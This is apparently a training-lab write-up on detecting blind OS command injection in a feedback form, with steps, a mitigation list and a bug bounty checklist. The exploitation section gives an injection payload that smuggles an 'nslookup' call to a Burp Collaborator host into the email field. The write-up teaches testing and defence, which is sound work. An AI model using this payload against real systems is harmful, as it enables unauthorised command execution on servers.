# Lab 04 – Blind OS Command Injection with Out-of-Band (OAST) Interaction

## Lab Overview

**Objective**

Exploit a Blind OS Command Injection vulnerability by triggering an out-of-band (OAST) DNS interaction using Burp Collaborator.

The application executes injected commands but does not return their output or exhibit measurable response delays.

---

# Vulnerability

The feedback functionality incorporates user-controlled input into an operating system command.

Although the injected command executes, the application:

- Returns no command output.
- Does not provide useful timing differences.

An external interaction is therefore required to confirm execution.

---

# Reconnaissance

1. Open the feedback form.
2. Complete the required fields.
3. Intercept the request in Burp Suite.
4. Generate a unique Burp Collaborator payload.

---

# Exploitation

Modify the email parameter.

Original:

```text
user@example.com
```

Modified:

```text
x||nslookup BURP-COLLABORATOR-SUBDOMAIN||
```

Replace `BURP-COLLABORATOR-SUBDOMAIN` with the unique domain generated by Burp Collaborator.

Submit the request.

---

# Verify the Interaction

After sending the request:

1. Open the **Burp Collaborator** client.
2. Click **Poll now**.

---

# Successful Result

Burp Collaborator records a **DNS lookup** for the generated domain.

The DNS interaction confirms that the injected operating system command was executed successfully.

---

# Why It Works

The injected `nslookup` command causes the server to resolve the supplied Collaborator domain.

Although the application hides command output, it cannot prevent the outbound DNS request generated by the operating system.

---

# Impact

This technique confirms Blind OS Command Injection even when:

- Command output is unavailable.
- Response timing is unreliable.
- Output redirection is not possible.

---

# Mitigation

- Avoid invoking operating system commands where possible.
- Apply strict allowlist-based input validation.
- Restrict outbound network access where appropriate.

---

# Bug Bounty Methodology

1. Identify blind command execution.
2. Generate a Burp Collaborator payload.
3. Inject an `nslookup` command.
4. Submit the request.
5. Poll Burp Collaborator.
6. Confirm the DNS interaction.

---

# Key Learnings

- Burp Collaborator is an effective method for detecting Blind OS Command Injection.
- DNS interactions provide reliable evidence of successful command execution.
- OAST techniques are particularly useful when other confirmation methods fail.
